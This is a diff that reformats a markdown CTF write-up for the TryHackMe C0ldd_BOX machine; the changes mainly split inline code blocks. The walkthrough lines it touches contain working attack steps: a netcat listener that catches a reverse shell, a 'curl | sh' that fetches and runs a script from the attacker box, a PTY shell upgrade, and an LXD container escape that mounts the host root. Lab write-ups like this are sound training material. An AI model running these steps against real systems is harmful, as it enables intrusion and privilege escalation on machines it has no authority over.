@@ -41,23 +41,29 @@ ll>.
 
 ![5](https://github.com/nairitya03/CTF-WriteUps/blob/main/THM/C0ldd_BOX/Screenshots/5.png)
 
-I started a netcat listener on my machine on port 8000 ```bash # nc -lvnp 8000 ```
+I started a netcat listener on my machine on port 8000 
+```bash # nc -lvnp 8000 ```
 and got a reverse shell by activating our plugin and found that www-data
 user have very less permissions thus I enumerated the target using
 [linpeas.sh]( https://github.com/carlospolop/privilege-escalation-awesome-scripts-suit
 e/tree/master/linPEAS ).Download the linpeas.sh file form Github on your
 machine,cd to the downloaded directory and start a simple python server on
-your machine ```bash # python3 -m http.server 1234 ``` and on target run it using
-``` $ curl http://<attackbox_ip>:1234/linpeas.sh | sh ```, This will directly
+your machine 
+```bash # python3 -m http.server 1234 ``` 
+and on target run it using
+```bash $ curl http://<attackbox_ip>:1234/linpeas.sh | sh ```
+This will directly
 run the shell script on the target machine.
 
 ![6](https://github.com/nairitya03/CTF-WriteUps/blob/main/THM/C0ldd_BOX/Screenshots/6.png)
 
 This gave away wp-config.php file that contained password of user _c0ldd_.
 To su to _c0ldd_ user we need a stable shell, stablizing shell by this great
-one-liner ```bash $ pyhton3 -c ‘import pty;pty.spawn(“/bin/bash”)  $ su c0ldd ``` 
+one-liner 
+```bash $ pyhton3 -c ‘import pty;pty.spawn(“/bin/bash”)  $ su c0ldd ```
 and use password _cybersecurity_ to get access. Now cat the user.txt flag in
-/home/c0ldd directory ```bash $ cat /home/c0ldd/user.txt ```.
+/home/c0ldd directory 
+```bash $ cat /home/c0ldd/user.txt ```
 
 ![7](https://github.com/nairitya03/CTF-WriteUps/blob/main/THM/C0ldd_BOX/Screenshots/7.png)
 
@@ -75,25 +81,26 @@ Lets exploit this service, Download the vulnerable container image using
 cd to download dir and start http server and transfer the file to target machine
 using wget.
 
->Add the image :
+> Add the image :
 ```bash $ lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 $ lxc image list -- You can see your new imported image
 ```
->Create a container and add root path
+> Create a container and add root path
 ```bash
 $ lxc init alpine privesc -c security.privileged=true
 $ lxc list 
 $ lxc config device add privesc host-root disk source=/ path=/mnt/root
 recursive=true
 ```
->Execute the container:
+> Execute the container:
 ```bash
 $ lxc start privesc
 $ lxc exec privesc /bin/sh
 ```
 
 As this container is mounted with /root directory we can access root.txt
-inside it ```bash $ cat /mnt/root/root.txt ```
+inside it 
+```bash $ cat /mnt/root/root.txt ```
 
 ![9](https://github.com/nairitya03/CTF-WriteUps/blob/main/THM/C0ldd_BOX/Screenshots/9.png)
 
